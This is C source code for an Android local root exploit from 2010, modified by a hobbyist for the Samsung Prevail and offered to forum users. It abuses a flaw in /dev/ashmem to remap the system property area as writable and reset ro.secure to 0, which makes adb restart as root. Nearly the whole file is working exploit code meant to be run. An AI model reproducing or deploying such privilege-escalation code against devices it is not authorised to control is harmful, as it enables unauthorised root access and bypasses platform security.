/* ro.secure reset exploit for all androids < 2.3.
 *
 * Rage Against The Machine: Killing In The Name Of
 *
 * (C) 2010 The Android Exploid Crew
 * This exploit resets ro.secure to 0 even if executed as user.
 * Then re-connect to the device via "adb -d shell" to get a rootshell.
 *
 * Explanation:
 * The /dev/ashmem protection implementation is buggy. Anyone can
 * re-map the shared mem (which is owned by init and contains the system
 * properties) to R/W permissions. Then simply re-set ro.secure to 0
 * and restart adb which then runs as root rather than shell-user.
 */
 
 /*Code modified by Interdph for the Prevail and possibly other phones, also made some bug fixes 
 renamed to KillingMeSoftly because rooting this phone near killed me! 
 
Thanks to #prevail members, Shabbypenguin, LeetWolf, Jude, ThomasSkull, and Ravious

Enjoy your root*/
 
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}

#define PA_SIZE 32768
#define PA_INFO_START 1024
#define DEFAULTPROP 0x40000000
#define PROP_NAME_MAX   32
#define PROP_VALUE_MAX  92

struct prop_info {
	char name[PROP_NAME_MAX];
	unsigned volatile serial;
	char value[PROP_VALUE_MAX];
};


struct prop_area {
	unsigned volatile count;
	unsigned volatile serial;
	unsigned magic;
	unsigned version;
	unsigned reserved[4];
	unsigned toc[1];
};


char *find_prop_area()
{
	char buf[256];
	char *val = NULL;

	FILE *f = fopen("/proc/self/maps", "r");
	if (!f)
		die("[-] fopen");
	for (;!feof(f);) {
		if (!fgets(buf, sizeof(buf), f))
			break;
		if (strstr(buf, "system_properties") != NULL) {
                        val = strchr(buf, '-');
                        if (!val)
                                break;
                        *val = 0;
                        val = (char *)strtoul(buf, NULL, 16);
                        break;
                }
        }
        fclose(f);
        return val;
}


void restart_adb()
{
	kill(-1, 9);
}

int main(int argc, char **argv)
{

	char *prop = NULL;
	struct prop_info *pi = NULL;
	struct prop_area *pa = NULL;
//May want to restart phone on program entry? or through a script through best results

	printf("[*] CVE-2010-743C Android local root exploit (C) 2010 743C\n");
	printf("[*] The Android Exploid Crew Gentlemens club - dominating robots since 2008.\n\n");
   	printf("[*] Donate to 7-4-3-C@web.de if you like\n\n");
        printf("\n\n[*]Modified by interdpth for the prevail and possibly other phones\n");
	sleep(3);

	prop = find_prop_area();

	if (!prop)
		die("[-] Cannot find prop area");

	printf("[+] Found prop area @ %p\n", prop);
	if (mprotect(prop, PA_SIZE, PROT_READ|PROT_WRITE) < 0)
		die("[-] mprotect");

	pi = (struct prop_info *)(prop + PA_INFO_START);
	pa = (struct prop_area *)prop;

	while (pa->count--) {
		printf("[*] %s: %s\n", pi->name, pi->value);
		if (strcmp(pi->name, "ro.secure") == 0) {//Sometimes the ro.secure doesn't come up so the "" is for that
			strcpy(pi->value, "0");
			sleep(2);
			printf("[+] ro.secure reset to 0\n");
			
			//User doesn't need to know this?
                       printf("[*] root secured, start a new shell.\n");
			//Putting this code in here because it'd make the user restart the phone if failed.
		  
			sleep(2);
			fflush(stdout); 
			sleep(2);
		     
			return 0;
		}else if(strcmp(pi->name,"")==0){
		  printf("error occured! Reboot phone!\n");
		  return 0;
		}
		++pi;
	}
	        
		     
	printf("[*] I think we failed....\n");
	return 0;
}

